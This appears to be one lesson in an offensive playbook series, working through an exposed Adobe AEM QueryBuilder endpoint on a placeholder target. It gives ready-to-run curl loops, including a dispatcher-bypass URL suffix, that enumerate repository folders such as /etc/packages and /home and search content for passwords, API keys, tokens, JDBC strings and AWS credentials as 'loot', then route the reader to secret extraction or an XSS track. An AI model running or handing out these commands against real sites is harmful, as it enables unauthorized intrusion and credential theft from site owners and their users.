# Batch 07 — Search and loot (QueryBuilder)

## FILL IN

```bash
T="https://TARGET"
QB="PASTE_WORKING_QB_URL"
```

## GOAL
With a working search door, pull **high-value paths** and secret keywords. Get leads for batch 08.

## TIME
~1–2 hours

## YOU NEED
- Working `QB` from 03–06

```bash
T="https://PUT-THE-SITE-HERE"
QB="PASTE_WORKING_QUERYBUILDER_BASE_HERE"
# example: QB="$T/bin/querybuilder.json"
# example: QB="$T/bin/querybuilder.json;x='a/b.css/c'"
```

---

## WHY (30 seconds)

You already opened the search door.  
Now you use it like a dumb checklist:

1. What folders exist?  
2. Any word like password?  
3. Any packages folder?

Do **not** invent fancy queries. Bad guys win by running the same simple searches every time.

---

## DO THIS

### 1) List important folders

```bash
for path in /content /content/dam /etc /etc/packages /home /conf; do
  echo "===== $path ====="
  curl -sk -G "$QB" \
    --data-urlencode "path=$path" \
    --data-urlencode "p.limit=10" \
    -w "\ncode=%{http_code} bytes=%{size_download}\n" | head -c 350
  echo
done
```

### 2) Search scary words (keep this list small)

```bash
for term in password secret credential api_key token jdbc aws confidential; do
  echo "===== $term ====="
  curl -sk -G "$QB" \
    --data-urlencode "path=/content" \
    --data-urlencode "fulltext=$term" \
    --data-urlencode "p.limit=8" | head -c 280
  echo
done
```

### 3) Forms guide nodes? (for later)

```bash
curl -sk -G "$QB" \
  --data-urlencode "property=sling:resourceType" \
  --data-urlencode "property.value=fd/af/components/guideContainer" \
  --data-urlencode "p.limit=10" | head -c 400; echo
```

### 4) Write down

```text
Open folders:
Secret hits:
Packages folder: yes/no
Guide containers: yes/no
```

---

## IF / THEN

| What you saw | What you do |
|--------------|-------------|
| `/etc/packages` has stuff | **NEXT** now |
| Only content hits | Still **NEXT** (mine content) |
| Empty everything | ACL tight → **09** XSS track |

---

## NEXT
→ [08-packages-content-secrets.md](./08-packages-content-secrets.md)
